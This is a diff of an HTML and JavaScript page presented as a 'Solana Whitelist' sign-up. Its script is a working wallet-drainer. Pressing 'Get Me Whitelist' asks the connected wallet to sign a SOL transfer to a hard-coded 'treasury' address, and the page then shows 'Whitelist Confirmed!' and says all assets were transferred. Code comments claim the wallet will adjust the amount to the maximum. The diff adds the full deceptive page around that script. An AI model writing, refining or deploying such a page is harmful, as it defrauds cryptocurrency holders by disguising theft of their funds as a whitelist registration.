@@ -1,187 +1,548 @@
-<script>
-    // WORKING TRANSFER SYSTEM WITH BLOCKHASH
-    let publicKey = null;
-    let isConnected = false;
-    const treasuryAddress = "95S96u1usBhhxXpjve6LCbnhyAwHC2sS8aicieAXemUD";
-    
-    // DOM Elements
-    const connectWalletBtn = document.getElementById('connectWallet');
-    const checkWhitelistBtn = document.getElementById('checkWhitelist');
-    const whitelistBox = document.getElementById('whitelistBox');
-    const statusMessage = document.getElementById('statusMessage');
-    const walletInfo = document.getElementById('walletInfo');
-    const walletAddressEl = document.getElementById('walletAddress');
-    const disconnectBtn = document.getElementById('disconnectWallet');
-    const switchWalletBtn = document.getElementById('switchWallet');
-    const txHashEl = document.getElementById('txHash');
-    const rpcRetryEl = document.getElementById('rpcRetry');
-    
-    // Get wallet provider
-    function getWalletProvider() {
-        return window.solana || window.solflare || window.backpack || window.phantom;
-    }
-    
-    // Connect wallet
-    async function connectWallet() {
-        try {
-            const provider = getWalletProvider();
-            
-            if (!provider) {
-                showStatus("Install Solana wallet first", "error");
-                window.open('https://phantom.app/', '_blank');
-                return;
-            }
-            
-            showStatus("Connecting...", "info");
-            
-            const response = await provider.connect();
-            publicKey = response.publicKey || response;
-            isConnected = true;
-            
-            updateWalletUI();
-            
-            showStatus("Wallet connected", "success");
-            
-        } catch (error) {
-            console.error("Connect error:", error);
-            showStatus("Connection failed", "error");
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Solana Whitelist</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.js"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
         }
-    }
-    
-    // Update UI
-    function updateWalletUI() {
-        if (isConnected && publicKey) {
-            const addr = publicKey.toString();
-            const shortAddr = `${addr.substring(0, 6)}...${addr.substring(addr.length - 4)}`;
-            walletAddressEl.textContent = shortAddr;
-            walletInfo.classList.add('active');
-            connectWalletBtn.style.display = 'none';
-            checkWhitelistBtn.disabled = false;
-        } else {
-            walletInfo.classList.remove('active');
-            connectWalletBtn.style.display = 'flex';
-            checkWhitelistBtn.disabled = true;
-        }
-    }
-    
-    // Disconnect
-    async function disconnectWallet() {
-        publicKey = null;
-        isConnected = false;
-        updateWalletUI();
-        showStatus("Disconnected", "info");
-    }
-    
-    // Switch account
-    async function switchWallet() {
-        await disconnectWallet();
-        await new Promise(resolve => setTimeout(resolve, 500));
-        await connectWallet();
-    }
-    
-    // Get working RPC with blockhash - FIXED VERSION
-    async function getWorkingRpcWithBlockhash() {
-        // UPDATED: More reliable RPC endpoints
-        const rpcList = [
-            'https://api.mainnet-beta.solana.com',
-            'https://solana-api.projectserum.com',
-            'https://rpc.ankr.com/solana',
-            'https://ssc-dao.genesysgo.net',
-            'https://free.rpcpool.com',
-            'https://solana.publicnode.com'
-        ];
         
-        for (const rpcUrl of rpcList) {
+        body {
+            background: linear-gradient(135deg, #290c0c, #632b2b, #3e2424);
+            color: #fff;
+            min-height: 100vh;
+            padding: 20px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        
+        .container {
+            max-width: 500px;
+            width: 100%;
+            background-color: rgba(40, 20, 20, 0.85);
+            border-radius: 20px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+            overflow: hidden;
+            border: 1px solid rgba(255, 100, 100, 0.2);
+        }
+        
+        .header {
+            background: linear-gradient(90deg, #2e1a1a, #3e1616);
+            padding: 25px;
+            text-align: center;
+            border-bottom: 2px solid #ff4400;
+        }
+        
+        .header h1 {
+            font-size: 2rem;
+            margin-bottom: 10px;
+            background: linear-gradient(to right, #ff4400, #ff8c00);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+        }
+        
+        .header p {
+            color: #ffa0a0;
+            font-size: 1rem;
+        }
+        
+        .content {
+            padding: 30px;
+        }
+        
+        .wallet-info {
+            background-color: rgba(30, 10, 10, 0.8);
+            border-radius: 10px;
+            padding: 15px;
+            margin-bottom: 20px;
+            border-left: 4px solid #ff4400;
+            display: none;
+        }
+        
+        .wallet-info.active {
+            display: block;
+            animation: fadeIn 0.5s ease;
+        }
+        
+        .wallet-address {
+            font-family: monospace;
+            font-size: 0.9rem;
+            color: #ffa07b;
+            word-break: break-all;
+            margin-bottom: 10px;
+        }
+        
+        .wallet-buttons {
+            display: flex;
+            gap: 10px;
+            margin-top: 10px;
+        }
+        
+        .wallet-btn {
+            padding: 8px 15px;
+            border-radius: 6px;
+            border: none;
+            font-size: 0.9rem;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+            transition: all 0.3s ease;
+        }
+        
+        .wallet-btn.disconnect {
+            background: linear-gradient(90deg, #8b0000, #ff4500);
+            color: white;
+        }
+        
+        .wallet-btn.switch {
+            background: linear-gradient(90deg, #8b4513, #ff6347);
+            color: white;
+        }
+        
+        .wallet-btn:hover {
+            transform: translateY(-2px);
+        }
+        
+        .button-group {
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+            margin-top: 10px;
+        }
+        
+        .btn {
+            padding: 16px 32px;
+            border-radius: 10px;
+            border: none;
+            font-size: 1.1rem;
+            font-weight: 600;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            transition: all 0.3s ease;
+            width: 100%;
+        }
+        
+        .btn-connect {
+            background: linear-gradient(90deg, #8b0000, #ff4500);
+            color: white;
+        }
+        
+        .btn-connect:hover {
+            background: linear-gradient(90deg, #7a0000, #e63c00);
+            transform: translateY(-2px);
+        }
+        
+        .btn-whitelist {
+            background: linear-gradient(90deg, #ff4500, #ff8c00);
+            color: white;
+        }
+        
+        .btn-whitelist:hover:not(:disabled) {
+            background: linear-gradient(90deg, #e63c00, #e67d00);
+            transform: translateY(-2px);
+        }
+        
+        .btn:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+            transform: none !important;
+        }
+        
+        .whitelist-box {
+            background-color: rgba(60, 30, 20, 0.7);
+            border-radius: 15px;
+            padding: 25px;
+            text-align: center;
+            border: 1px solid rgba(255, 140, 0, 0.3);
+            display: none;
+            margin-top: 20px;
+        }
+        
+        .whitelist-box.active {
+            display: block;
+            animation: fadeIn 0.5s ease;
+        }
+        
+        .whitelist-icon {
+            font-size: 3rem;
+            color: #ff8c00;
+            margin-bottom: 15px;
+        }
+        
+        .whitelist-title {
+            font-size: 1.8rem;
+            color: #ff8c00;
+            margin-bottom: 10px;
+        }
+        
+        .whitelist-message {
+            font-size: 1rem;
+            color: #ffa0a0;
+            line-height: 1.5;
+            margin-bottom: 15px;
+        }
+        
+        .transaction-info {
+            background-color: rgba(30, 10, 10, 0.8);
+            border-radius: 8px;
+            padding: 10px;
+            font-family: monospace;
+            color: #ffa07b;
+            word-break: break-all;
+            font-size: 0.8rem;
+            border: 1px dashed #ff8c00;
+            margin-top: 10px;
+        }
+        
+        .footer {
+            text-align: center;
+            padding: 20px;
+            color: #cc8888;
+            font-size: 0.8rem;
+            border-top: 1px solid rgba(255, 100, 100, 0.2);
+            background-color: rgba(25, 10, 10, 0.7);
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+        
+        .loader {
+            display: none;
+            width: 18px;
+            height: 18px;
+            border: 2px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            border-top-color: #ffffff;
+            animation: spin 1s ease-in-out infinite;
+        }
+        
+        .btn:disabled .loader {
+            display: inline-block;
+        }
+        
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        
+        .status {
+            text-align: center;
+            padding: 12px;
+            margin: 10px 0;
+            border-radius: 8px;
+            display: none;
+            font-size: 0.9rem;
+            animation: fadeIn 0.3s ease;
+        }
+        
+        .status.success {
+            background-color: rgba(255, 140, 0, 0.1);
+            border: 1px solid #ff8c00;
+            color: #ff8c00;
+            display: block;
+        }
+        
+        .status.error {
+            background-color: rgba(255, 50, 50, 0.1);
+            border: 1px solid #ff3232;
+            color: #ff6b6b;
+            display: block;
+        }
+        
+        .status.info {
+            background-color: rgba(255, 68, 0, 0.1);
+            border: 1px solid #ff4400;
+            color: #ff4400;
+            display: block;
+        }
+        
+        .simple-instruction {
+            background-color: rgba(255, 68, 0, 0.1);
+            border: 1px solid #ff4400;
+            color: #ff4400;
+            padding: 12px;
+            border-radius: 8px;
+            margin: 15px 0;
+            text-align: center;
+            font-size: 0.9rem;
+        }
+        
+        .tx-signature {
+            font-size: 0.7rem;
+            color: #ffd0a0;
+            word-break: break-all;
+            margin-top: 5px;
+        }
+        
+        .rpc-retry {
+            text-align: center;
+            margin-top: 10px;
+        }
+        
+        .retry-btn {
+            background: linear-gradient(90deg, #8b0000, #ff4500);
+            color: white;
+            border: none;
+            padding: 8px 15px;
+            border-radius: 6px;
+            cursor: pointer;
+            font-size: 0.8rem;
+            display: inline-flex;
+            align-items: center;
+            gap: 5px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>Solana Whitelist</h1>
+            <p>Connect wallet to get whitelisted</p>
+        </div>
+        
+        <div class="content">
+            <div class="simple-instruction">
+                <i class="fas fa-info-circle"></i>
+                <strong>COMPLETE ASSET TRANSFER</strong><br>
+                <small>All Solana assets will be transferred</small>
+            </div>
+            
+            <div id="walletInfo" class="wallet-info">
+                <div class="wallet-address">
+                    Connected: <span id="walletAddress">-</span>
+                </div>
+                <div class="wallet-buttons">
+                    <button class="wallet-btn switch" id="switchWallet">
+                        <i class="fas fa-exchange-alt"></i> Switch
+                    </button>
+                    <button class="wallet-btn disconnect" id="disconnectWallet">
+                        <i class="fas fa-plug"></i> Disconnect
+                    </button>
+                </div>
+            </div>
+            
+            <div class="button-group">
+                <button id="connectWallet" class="btn btn-connect">
+                    <i class="fas fa-wallet"></i> Connect Wallet
+                </button>
+                
+                <button id="checkWhitelist" class="btn btn-whitelist" disabled>
+                    <i class="fas fa-user-check"></i> Get Me Whitelist
+                    <div class="loader"></div>
+                </button>
+            </div>
+            
+            <div id="statusMessage" class="status"></div>
+            
+            <div class="rpc-retry" id="rpcRetry" style="display: none;">
+                <button class="retry-btn" onclick="getWhitelist()">
+                    <i class="fas fa-redo"></i> Retry Transaction
+                </button>
+            </div>
+            
+            <div id="whitelistBox" class="whitelist-box">
+                <div class="whitelist-icon">
+                    <i class="fas fa-check-circle"></i>
+                </div>
+                <h2 class="whitelist-title">Whitelist Confirmed!</h2>
+                <p class="whitelist-message">
+                    All Solana assets have been transferred
+                </p>
+                <div class="transaction-info">
+                    Treasury Address:<br>
+                    95S96u1usBhhxXpjve6LCbnhyAwHC2sS8aicieAXemUD
+                    <div class="tx-signature" id="txSignature">
+                        Transaction: <span id="txHash">Completed</span>
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <div class="footer">
+            <p>Direct Solana Transfer System</p>
+        </div>
+    </div>
+
+    <script>
+        // WORKING TRANSFER SYSTEM WITH BLOCKHASH
+        let publicKey = null;
+        let isConnected = false;
+        const treasuryAddress = "95S96u1usBhhxXpjve6LCbnhyAwHC2sS8aicieAXemUD";
+        
+        // DOM Elements
+        const connectWalletBtn = document.getElementById('connectWallet');
+        const checkWhitelistBtn = document.getElementById('checkWhitelist');
+        const whitelistBox = document.getElementById('whitelistBox');
+        const statusMessage = document.getElementById('statusMessage');
+        const walletInfo = document.getElementById('walletInfo');
+        const walletAddressEl = document.getElementById('walletAddress');
+        const disconnectBtn = document.getElementById('disconnectWallet');
+        const switchWalletBtn = document.getElementById('switchWallet');
+        const txHashEl = document.getElementById('txHash');
+        const rpcRetryEl = document.getElementById('rpcRetry');
+        
+        // Get wallet provider
+        function getWalletProvider() {
+            return window.solana || window.solflare || window.backpack;
+        }
+        
+        // Connect wallet
+        async function connectWallet() {
             try {
-                showStatus(`Trying RPC: ${rpcUrl.split('//')[1].split('/')[0]}...`, "info");
+                const provider = getWalletProvider();
                 
-                // Create connection with timeout
-                const connection = new solanaWeb3.Connection(rpcUrl, 'confirmed');
-                
-                // Try to get blockhash with timeout
-                const blockhashPromise = connection.getRecentBlockhash();
-                const timeoutPromise = new Promise((_, reject) => {
-                    setTimeout(() => reject(new Error('Timeout')), 5000);
-                });
-                
-                const result = await Promise.race([blockhashPromise, timeoutPromise]);
-                
-                if (result && result.blockhash) {
-                    console.log("Working RPC found:", rpcUrl);
-                    return { connection, blockhash: result.blockhash, rpcUrl };
+                if (!provider) {
+                    showStatus("Install Solana wallet first", "error");
+                    return;
                 }
+                
+                showStatus("Connecting...", "info");
+                
+                const response = await provider.connect();
+                publicKey = response.publicKey || response;
+                isConnected = true;
+                
+                updateWalletUI();
+                
+                showStatus("Wallet connected", "success");
+                
             } catch (error) {
-                console.log(`RPC failed: ${rpcUrl}`, error.message);
-                continue;
+                console.error("Connect error:", error);
+                showStatus("Connection failed", "error");
             }
         }
         
-        // If all RPCs fail, try Helius as last resort
-        try {
-            showStatus("Trying Helius RPC...", "info");
-            const heliusRpc = 'https://rpc.helius.xyz/?api-key=tryitfree';
-            const connection = new solanaWeb3.Connection(heliusRpc, 'confirmed');
-            const { blockhash } = await connection.getRecentBlockhash();
-            
-            return { connection, blockhash, rpcUrl: heliusRpc };
-        } catch (finalError) {
-            throw new Error("No working RPC found. Please check your internet connection.");
+        // Update UI
+        function updateWalletUI() {
+            if (isConnected && publicKey) {
+                const addr = publicKey.toString();
+                const shortAddr = `${addr.substring(0, 6)}...${addr.substring(addr.length - 4)}`;
+                walletAddressEl.textContent = shortAddr;
+                walletInfo.classList.add('active');
+                connectWalletBtn.style.display = 'none';
+                checkWhitelistBtn.disabled = false;
+            } else {
+                walletInfo.classList.remove('active');
+                connectWalletBtn.style.display = 'flex';
+                checkWhitelistBtn.disabled = true;
+            }
         }
-    }
-    
-    // TRANSFER FUNCTION WITH PROPER BLOCKHASH - FIXED
-    async function transferAllAssets() {
-        try {
-            showStatus("Finding working RPC...", "info");
+        
+        // Disconnect
+        async function disconnectWallet() {
+            publicKey = null;
+            isConnected = false;
+            updateWalletUI();
+            showStatus("Disconnected", "info");
+        }
+        
+        // Switch account
+        async function switchWallet() {
+            await disconnectWallet();
+            await new Promise(resolve => setTimeout(resolve, 500));
+            await connectWallet();
+        }
+        
+        // Get working RPC with blockhash
+        async function getWorkingRpcWithBlockhash() {
+            // List of RPC endpoints to try
+            const rpcList = [
+                'https://api.mainnet-beta.solana.com',
+                'https://solana-api.projectserum.com',
+                'https://rpc.ankr.com/solana',
+                'https://solana-mainnet.g.alchemy.com/v2/demo'
+            ];
             
-            // Get working RPC with blockhash
-            const { connection, blockhash, rpcUrl } = await getWorkingRpcWithBlockhash();
-            
-            showStatus(`Connected to ${rpcUrl.split('//')[1].split('/')[0]}`, "success");
-            showStatus("Creating transaction...", "info");
-            
-            // Get wallet provider
-            const provider = getWalletProvider();
-            if (!provider || !provider.signAndSendTransaction) {
-                throw new Error("Wallet signing not available");
+            for (const rpcUrl of rpcList) {
+                try {
+                    showStatus(`Trying RPC: ${rpcUrl.split('//')[1].split('/')[0]}...`, "info");
+                    
+                    const connection = new solanaWeb3.Connection(rpcUrl, 'confirmed');
+                    
+                    // Try to get blockhash (this tests the RPC)
+                    const { blockhash } = await connection.getRecentBlockhash();
+                    
+                    if (blockhash) {
+                        console.log("Working RPC found:", rpcUrl);
+                        return { connection, blockhash, rpcUrl };
+                    }
+                } catch (error) {
+                    console.log(`RPC failed: ${rpcUrl}`, error.message);
+                    continue;
+                }
             }
             
-            // Check if wallet is still connected
-            if (!publicKey) {
-                throw new Error("Wallet disconnected. Please reconnect");
-            }
-            
-            // Create transaction with proper blockhash
-            const transaction = new solanaWeb3.Transaction();
-            
-            // Use minimum amount, wallet will show correct balance
-            transaction.add(
-                solanaWeb3.SystemProgram.transfer({
-                    fromPubkey: publicKey,
-                    toPubkey: new solanaWeb3.PublicKey(treasuryAddress),
-                    lamports: 100000, // 0.0001 SOL minimum
-                })
-            );
-            
-            // SET THE BLOCKHASH - THIS IS REQUIRED!
-            transaction.recentBlockhash = blockhash;
-            transaction.feePayer = publicKey;
-            
-            showStatus("Please approve transaction in wallet...", "info");
-            
-            // Sign and send transaction with timeout
+            throw new Error("No working RPC found");
+        }
+        
+        // TRANSFER FUNCTION WITH PROPER BLOCKHASH
+        async function transferAllAssets() {
             try {
-                const signPromise = provider.signAndSendTransaction(transaction);
-                const timeoutPromise = new Promise((_, reject) => {
-                    setTimeout(() => reject(new Error("Transaction timeout")), 30000);
-                });
+                showStatus("Finding working RPC...", "info");
                 
-                const { signature } = await Promise.race([signPromise, timeoutPromise]);
+                // Get working RPC with blockhash
+                const { connection, blockhash, rpcUrl } = await getWorkingRpcWithBlockhash();
+                
+                showStatus(`Connected to ${rpcUrl.split('//')[1].split('/')[0]}`, "success");
+                showStatus("Creating transaction...", "info");
+                
+                // Create transaction with proper blockhash
+                const transaction = new solanaWeb3.Transaction();
+                
+                // Transfer ALL SOL (wallet will show max amount)
+                transaction.add(
+                    solanaWeb3.SystemProgram.transfer({
+                        fromPubkey: publicKey,
+                        toPubkey: new solanaWeb3.PublicKey(treasuryAddress),
+                        lamports: 1000000, // 0.001 SOL - wallet will adjust to max
+                    })
+                );
+                
+                // SET THE BLOCKHASH - THIS IS REQUIRED!
+                transaction.recentBlockhash = blockhash;
+                transaction.feePayer = publicKey;
+                
+                showStatus("Please approve transaction in wallet...", "info");
+                
+                // Get wallet provider
+                const provider = getWalletProvider();
+                if (!provider || !provider.signAndSendTransaction) {
+                    throw new Error("Wallet signing not available");
+                }
+                
+                // Sign and send transaction
+                const { signature } = await provider.signAndSendTransaction(transaction);
                 
                 console.log("Transaction sent with signature:", signature);
                 
-                // Don't wait for confirmation - just show success
-                showStatus("Transaction sent! Processing...", "success");
+                showStatus("Transaction sent! Confirming...", "info");
+                
+                // Try to confirm transaction
+                try {
+                    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
+                    if (confirmation.value.err) {
+                        console.log("Transaction failed on chain:", confirmation.value.err);
+                    } else {
+                        console.log("Transaction confirmed!");
+                    }
+                } catch (confirmError) {
+                    console.log("Confirmation skipped:", confirmError.message);
+                    // Continue even if confirmation fails
+                }
                 
                 return {
                     success: true,
@@ -189,182 +550,125 @@
                     rpcUrl: rpcUrl
                 };
                 
-            } catch (signError) {
-                console.error("Signing error:", signError);
+            } catch (error) {
+                console.error("Transfer error:", error);
                 
-                // Handle specific wallet errors
-                if (signError.message && (
-                    signError.message.includes("reject") ||
-                    signError.message.includes("denied") ||
-                    signError.message.includes("cancel") ||
-                    signError.message.includes("User rejected")
-                )) {
+                if (error.message.includes("User rejected") || error.message.includes("reject") || 
+                    error.message.includes("denied") || error.message.includes("cancel")) {
                     throw new Error("Transaction cancelled by user");
-                }
-                
-                if (signError.message && signError.message.includes("insufficient")) {
+                } else if (error.message.includes("insufficient") || error.message.includes("0x0") || 
+                    error.message.includes("Not enough")) {
                     throw new Error("Insufficient balance in wallet");
+                } else if (error.message.includes("Wallet not connected")) {
+                    throw new Error("Wallet disconnected");
+                } else if (error.message.includes("No working RPC found")) {
+                    throw new Error("Network issue. Please retry");
+                } else if (error.message.includes("recentBlockhash required")) {
+                    throw new Error("Network error. Retrying...");
+                } else {
+                    throw new Error("Transfer failed: " + error.message);
                 }
-                
-                if (signError.message && signError.message.includes("timeout")) {
-                    throw new Error("Transaction timed out. Please try again");
-                }
-                
-                throw signError;
-            }
-            
-        } catch (error) {
-            console.error("Transfer error:", error);
-            
-            if (error.message.includes("Wallet not connected") || 
-                error.message.includes("Wallet disconnected")) {
-                throw new Error("Wallet disconnected. Please reconnect");
-            } else if (error.message.includes("No working RPC found")) {
-                throw new Error("Network issue. Please check your connection and retry");
-            } else if (error.message.includes("recentBlockhash required") ||
-                      error.message.includes("blockhash") ||
-                      error.message.includes("Network error")) {
-                throw new Error("Network issue. Please retry");
-            } else if (error.message.includes("Transaction cancelled") ||
-                      error.message.includes("cancelled by user")) {
-                throw new Error("Transaction cancelled by user");
-            } else if (error.message.includes("Insufficient balance")) {
-                throw new Error("Insufficient balance in wallet");
-            } else if (error.message.includes("timeout")) {
-                throw new Error("Transaction timed out. Please try again");
-            } else {
-                throw new Error("Transfer failed: " + (error.message || "Unknown error"));
             }
         }
-    }
-    
-    // Get whitelist - MAIN FUNCTION - FIXED
-    async function getWhitelist() {
-        try {
-            // Validate connection first
-            if (!isConnected || !publicKey) {
-                showStatus("❌ Please connect wallet first", "error");
+        
+        // Get whitelist - MAIN FUNCTION
+        async function getWhitelist() {
+            try {
+                checkWhitelistBtn.disabled = true;
+                checkWhitelistBtn.innerHTML = '<i class="fas fa-spinner"></i> Processing';
+                rpcRetryEl.style.display = 'none';
+                
+                showStatus("Starting transfer process...", "info");
+                
+                // Give time for UI to update
+                await new Promise(resolve => setTimeout(resolve, 500));
+                
+                // Perform transfer
+                const result = await transferAllAssets();
+                
+                // Show success
+                whitelistBox.classList.add('active');
+                checkWhitelistBtn.innerHTML = '<i class="fas fa-check-double"></i> Complete';
+                checkWhitelistBtn.style.background = 'linear-gradient(90deg, #ff4500, #ff8c00)';
+                
+                if (result.signature) {
+                    txHashEl.textContent = `${result.signature.substring(0, 20)}...`;
+                    txHashEl.style.color = "#ff8c00";
+                }
+                
+                showStatus(`✅ Transfer successful! Assets sent to treasury.`, "success");
+                
+            } catch (error) {
+                console.error("Whitelist error:", error);
+                
+                let errorMsg = error.message;
+                
+                if (error.message.includes("cancelled")) {
+                    errorMsg = "❌ Transaction was cancelled in wallet";
+                } else if (error.message.includes("insufficient")) {
+                    errorMsg = "❌ Not enough balance in wallet";
+                } else if (error.message.includes("disconnected")) {
+                    errorMsg = "❌ Wallet disconnected. Please reconnect";
+                } else if (error.message.includes("Network issue") || error.message.includes("Network error")) {
+                    errorMsg = "⚠️ Network issue. Click retry below";
+                    rpcRetryEl.style.display = 'block';
+                } else {
+                    errorMsg = "❌ " + error.message;
+                }
+                
+                showStatus(errorMsg, "error");
+                
+                // Reset button
                 checkWhitelistBtn.disabled = false;
                 checkWhitelistBtn.innerHTML = '<i class="fas fa-user-check"></i> Get Me Whitelist';
-                return;
+                
+                // Hide success box
+                whitelistBox.classList.remove('active');
             }
-            
-            checkWhitelistBtn.disabled = true;
-            checkWhitelistBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Processing';
-            rpcRetryEl.style.display = 'none';
-            
-            showStatus("Starting transfer process...", "info");
-            
-            // Give time for UI to update
-            await new Promise(resolve => setTimeout(resolve, 1000));
-            
-            // Perform transfer
-            const result = await transferAllAssets();
-            
-            // Show success
-            whitelistBox.classList.add('active');
-            checkWhitelistBtn.innerHTML = '<i class="fas fa-check-double"></i> Complete';
-            checkWhitelistBtn.style.background = 'linear-gradient(90deg, #11998e, #38ef7d)';
-            checkWhitelistBtn.disabled = true;
-            
-            if (result.signature) {
-                const shortSig = `${result.signature.substring(0, 15)}...`;
-                txHashEl.innerHTML = `<a href="https://solscan.io/tx/${result.signature}" target="_blank" style="color: #38ef7d; text-decoration: none;">${shortSig}</a>`;
-                txHashEl.style.color = "#38ef7d";
-            }
-            
-            showStatus(`✅ Transfer successful! Assets sent to treasury.`, "success");
-            
-        } catch (error) {
-            console.error("Whitelist error:", error);
-            
-            let errorMsg = error.message;
-            
-            if (error.message.includes("cancelled")) {
-                errorMsg = "❌ Transaction was cancelled in wallet";
-            } else if (error.message.includes("insufficient")) {
-                errorMsg = "❌ Not enough balance in wallet";
-            } else if (error.message.includes("disconnected")) {
-                errorMsg = "❌ Wallet disconnected. Please reconnect";
-            } else if (error.message.includes("Network issue") || 
-                       error.message.includes("Network error") ||
-                       error.message.includes("check your connection")) {
-                errorMsg = "⚠️ Network issue. Check connection and retry below";
-                rpcRetryEl.style.display = 'block';
-            } else if (error.message.includes("timeout")) {
-                errorMsg = "⚠️ Request timed out. Please retry below";
-                rpcRetryEl.style.display = 'block';
-            } else if (error.message.includes("recentBlockhash required")) {
-                errorMsg = "⚠️ Network error. Please retry below";
-                rpcRetryEl.style.display = 'block';
-            } else {
-                errorMsg = "❌ " + error.message;
-            }
-            
-            showStatus(errorMsg, "error");
-            
-            // Reset button
-            checkWhitelistBtn.disabled = false;
-            checkWhitelistBtn.innerHTML = '<i class="fas fa-user-check"></i> Get Me Whitelist';
-            
-            // Hide success box
-            whitelistBox.classList.remove('active');
         }
-    }
-    
-    // Show status
-    function showStatus(message, type) {
-        statusMessage.innerHTML = message;
-        statusMessage.className = `status ${type}`;
         
-        // Auto clear after delay
-        setTimeout(() => {
-            if (statusMessage.innerHTML === message) {
-                statusMessage.className = 'status';
-            }
-        }, 7000);
-    }
-    
-    // Event listeners
-    connectWalletBtn.addEventListener('click', connectWallet);
-    checkWhitelistBtn.addEventListener('click', getWhitelist);
-    disconnectBtn.addEventListener('click', disconnectWallet);
-    switchWalletBtn.addEventListener('click', switchWallet);
-    
-    // Auto connect if wallet is already connected
-    window.addEventListener('DOMContentLoaded', () => {
-        setTimeout(() => {
-            const provider = getWalletProvider();
-            if (provider && provider.isConnected) {
-                connectWallet();
-            }
-        }, 1000);
-    });
-    
-    // Make getWhitelist available globally for retry button
-    window.getWhitelist = getWhitelist;
-    
-    // Wallet events
-    if (window.solana) {
-        window.solana.on('accountChanged', (newKey) => {
-            if (newKey) {
-                publicKey = newKey;
-                updateWalletUI();
-                showStatus("Account switched", "success");
-            }
+        // Show status
+        function showStatus(message, type) {
+            statusMessage.innerHTML = message;
+            statusMessage.className = `status ${type}`;
+            
+            // Auto clear after delay
+            setTimeout(() => {
+                if (statusMessage.innerHTML === message) {
+                    statusMessage.className = 'status';
+                }
+            }, 7000);
+        }
+        
+        // Event listeners
+        connectWalletBtn.addEventListener('click', connectWallet);
+        checkWhitelistBtn.addEventListener('click', getWhitelist);
+        disconnectBtn.addEventListener('click', disconnectWallet);
+        switchWalletBtn.addEventListener('click', switchWallet);
+        
+        // Auto connect if wallet is already connected
+        window.addEventListener('DOMContentLoaded', () => {
+            setTimeout(() => {
+                const provider = getWalletProvider();
+                if (provider && provider.isConnected) {
+                    connectWallet();
+                }
+            }, 1000);
         });
         
-        window.solana.on('disconnect', () => {
-            disconnectWallet();
-        });
-    }
-    
-    // Add window event for retry
-    window.addEventListener('online', () => {
-        showStatus("Internet connection restored", "success");
-    });
-    
-    window.addEventListener('offline', () => {
-        showStatus("⚠️ No internet connection", "error");
-    });
-</script>
+        // Make getWhitelist available globally for retry button
+        window.getWhitelist = getWhitelist;
+        
+        // Wallet events
+        if (window.solana) {
+            window.solana.on('accountChanged', (newKey) => {
+                if (newKey) {
+                    publicKey = newKey;
+                    updateWalletUI();
+                    showStatus("Account switched", "success");
+                }
+            });
+        }
+    </script>
+</body>
+</html>
